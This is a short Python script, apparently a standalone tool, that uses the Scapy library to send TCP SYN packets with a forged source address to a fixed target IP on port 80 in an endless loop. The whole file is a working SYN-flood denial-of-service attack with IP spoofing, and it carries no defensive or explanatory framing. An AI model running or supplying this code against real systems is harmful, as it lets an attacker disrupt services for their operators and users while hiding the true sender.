from scapy.all import *

def send_syn_packet(target_ip, spoofed_ip, dport):
    # Create an IP packet with spoofed source IP address
    ip_packet = IP(src=spoofed_ip, dst=target_ip)
    
    # Create a TCP SYN packet
    tcp_syn_packet = TCP(dport=dport, flags="S")
    
    # Combine the IP and TCP layers
    packet = ip_packet / tcp_syn_packet
    
    # Send the packet
    send(packet, verbose=False)

def main():
    target_ip = "192.168.171.87"  # Define the target IP address
    spoofed_ip = "10.0.0.1"  # Define the spoofed source IP address
    port = 80  # Define the destination port
    
    try:
        # Send the packet indefinitely
        while True:
            send_syn_packet(target_ip, spoofed_ip, port)
            print(f"Sent spoofed SYN packet to {target_ip} on port {port}")
    except KeyboardInterrupt:
        print("\nTerminating the program...")

if __name__ == "__main__":
    main()
